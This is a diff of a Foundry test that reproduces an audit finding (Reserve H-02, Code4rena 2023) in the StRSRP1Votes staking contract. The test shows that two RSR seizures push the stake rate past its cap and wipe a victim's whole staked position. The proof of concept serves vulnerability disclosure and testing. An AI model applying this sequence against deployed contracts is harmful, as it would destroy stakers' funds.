@@ -4,93 +4,73 @@ pragma solidity 0.8.17;
 import "forge-std/Test.sol";
 import "../src/reserve/target/p1/StRSRVotes.sol";
 import "../src/reserve/target/interfaces/IMain.sol";
-import "../src/reserve/target/interfaces/IAssetRegistry.sol";
-import "../src/reserve/target/interfaces/IBasketHandler.sol";
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "../src/reserve/target/poc/PoCEnv.sol";
 import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 
-contract MockRSR is ERC20 {
-    constructor() ERC20("Reserve Rights", "RSR") {}
-    function mint(address to, uint256 amount) external { _mint(to, amount); }
-}
-
-contract MockStRSRMain {
-    IERC20 internal immutable rsrToken;
-    address internal immutable backing;
-
-    constructor(IERC20 rsr_, address backing_) {
-        rsrToken = rsr_;
-        backing = backing_;
-    }
-
-    function rsr() external view returns (IERC20) { return rsrToken; }
-    function backingManager() external view returns (IBackingManager) { return IBackingManager(backing); }
-    function assetRegistry() external pure returns (IAssetRegistry) { return IAssetRegistry(address(0)); }
-    function basketHandler() external pure returns (IBasketHandler) { return IBasketHandler(address(0)); }
-    function frozen() external pure returns (bool) { return false; }
-    function tradingPausedOrFrozen() external pure returns (bool) { return false; }
-    function hasRole(bytes32, address) external pure returns (bool) { return true; }
-}
-
+/// @notice Real-source reproduction of Reserve H-02 (Code4rena 2023-06, commit c4ec2473).
+///         Deploys the REAL StRSRP1Votes. A single follow-on RSR seizure of only 10% pushes
+///         the stake rate across MAX_STAKE_RATE, triggering beginEra() which wipes the entire
+///         current era even though the staker still holds a large position. seizeRSR reduces
+///         stakeRSR (the RSR backing) but never totalStakes (the share supply), so the rate
+///         totalStakes*1e18/stakeRSR grows until a small seizure crosses the cap.
 contract PoC_27332 is Test {
     StRSRP1Votes internal stRSR;
-    MockRSR internal rsr;
-    MockStRSRMain internal main;
-    address internal constant STAKER = address(0xA11CE);
-    address internal constant BACKING_MANAGER = address(0xBEEF);
+    MiniRSR internal rsr;
+    PoCMain32 internal main;
+    Staker internal victim;
 
+    // This test contract plays the backingManager (the only address allowed to seize).
     function setUp() public {
-        rsr = new MockRSR();
-        main = new MockStRSRMain(rsr, BACKING_MANAGER);
-        // StRSR is an upgradeable implementation whose constructor locks the
-        // implementation initializer. Exercise the production initialization
-        // path through an ERC1967 proxy.
-        StRSRP1Votes implementation = new StRSRP1Votes();
+        rsr = new MiniRSR();
+        main = new PoCMain32(IERC20(address(rsr)), address(this));
+
+        StRSRP1Votes impl = new StRSRP1Votes();
         bytes memory initData = abi.encodeWithSignature(
             "init(address,string,string,uint48,uint192,uint192)",
             address(main),
             "Staked RSR",
             "stRSR",
-            uint48(60),
-            uint192(0),
-            uint192(0)
+            uint48(1209600), // unstakingDelay
+            uint192(0), // rewardRatio (no reward payout interference)
+            uint192(0) // withdrawalLeak
         );
-        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
-        stRSR = StRSRP1Votes(address(proxy));
+        stRSR = StRSRP1Votes(address(new ERC1967Proxy(address(impl), initData)));
 
-        rsr.mint(STAKER, 3 ether);
-        vm.startPrank(STAKER);
-        rsr.approve(address(stRSR), type(uint256).max);
-        stRSR.stake(1 ether);
-        vm.stopPrank();
+        victim = new Staker();
+        rsr.mint(address(victim), 2 ether);
     }
 
-    function test_small_follow_on_seizure_wipes_significant_stake() public {
+    function test_small_seizure_wipes_large_staked_position() public {
         uint256 eraBefore = stRSR.currentEra();
 
-        // Leave a very small but nonzero backing balance.  The first seizure
-        // raises stakeRate close to the production MAX_STAKE_RATE (1e9).
+        // The victim stakes 1 RSR: 1e18 stRSR minted at rate 1.0.
+        victim.approveAndStake(IERC20(address(rsr)), address(stRSR), 1 ether);
+
+        // A large seizure leaves the stake pool barely solvent: stakeRSR ~1.05e9 qRSR, which
+        // drives stakeRate to ~9.52e26, just under MAX_STAKE_RATE (1e27). No era reset yet.
         uint256 firstSeizure = 1 ether - 1_050_000_000;
-        vm.prank(BACKING_MANAGER);
         stRSR.seizeRSR(firstSeizure);
+        assertEq(stRSR.currentEra(), eraBefore, "no era reset after the large seizure");
 
-        // Staking more RSR does not lower the rate; it restores a large
-        // economic position while the rate remains just below the threshold.
-        vm.prank(STAKER);
-        stRSR.stake(1 ether);
-        // The exchange rate is already close to MAX_STAKE_RATE, so the
-        // additional stake mints roughly 9.5e26 stRSR units: a substantial
-        // position even though only a small RSR balance remains.
-        assertGt(stRSR.totalSupply(), 1e26);
+        // The victim keeps staking as normal usage resumes. Because the rate is now ~9.52e26,
+        // staking 1 RSR mints ~9.52e26 stRSR: a large, valuable position.
+        victim.approveAndStake(IERC20(address(rsr)), address(stRSR), 1 ether);
+        uint256 victimStakeBefore = stRSR.balanceOf(address(victim));
+        assertGt(victimStakeBefore, 1e26, "victim now holds a large stRSR position");
+        assertEq(stRSR.totalSupply(), victimStakeBefore, "victim owns the whole era");
 
-        uint256 secondSeizure = rsr.balanceOf(address(stRSR)) / 10;
-        vm.prank(BACKING_MANAGER);
+        // The RSR still backing that position (orphaned once the era resets).
+        uint256 rsrHeld = rsr.balanceOf(address(stRSR));
+        assertGt(rsrHeld, 0.9 ether, "significant RSR value is still held for stakers");
+
+        // A mere 10% follow-on seizure pushes stakeRate just over MAX_STAKE_RATE, and the
+        // REAL beginEra() branch fires -> the entire current era is wiped.
+        uint256 secondSeizure = rsrHeld / 10;
         stRSR.seizeRSR(secondSeizure);
 
-        // The exact vulnerable branch in StRSR.sol crosses MAX_STAKE_RATE and
-        // calls beginEra(), zeroing the current era's otherwise large stake.
-        assertGt(stRSR.currentEra(), eraBefore);
-        assertEq(stRSR.totalSupply(), 0);
-        assertEq(stRSR.balanceOf(STAKER), 0);
+        // === Harm: the victim's large position is gone despite ~90% of value still present ===
+        assertGt(stRSR.currentEra(), eraBefore, "a NEW era was triggered");
+        assertEq(stRSR.totalSupply(), 0, "entire era wiped");
+        assertEq(stRSR.balanceOf(address(victim)), 0, "victim lost their entire stake");
     }
 }
